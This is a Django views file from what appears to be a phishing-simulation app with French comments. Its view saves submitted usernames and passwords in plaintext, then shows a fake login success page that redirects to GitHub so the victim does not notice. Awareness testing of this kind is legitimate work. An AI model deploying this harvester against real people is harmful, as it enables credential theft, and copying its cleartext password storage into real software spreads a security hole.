from django.shortcuts import render
from .models import PhishingData
from django.http import HttpResponse
# Create your views here.
# phishing_simulation/views.py



def phishing_page(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        # Enregistrer les données soumises
        PhishingData.objects.create(username=username, password=password)

        # Simuler une redirection vers une page de connexion légitime (par exemple, Microsoft 365)
        response_html = """
        <h3>Connexion réussie!</h3>
            <p>Vous serez redirigé vers votre tableau de bord GitHub dans quelques secondes...</p>
            <script>
                setTimeout(function() {
                    window.location.href = "https://github.com";  // Simulation de redirection vers GitHub
                }, 3000);  // Attendre 3 secondes avant la redirection
            </script>
        """
        return HttpResponse(response_html) # Simuler une redirection de connexion
    return render(request, 'phishing_simulation/phishing_page.html')
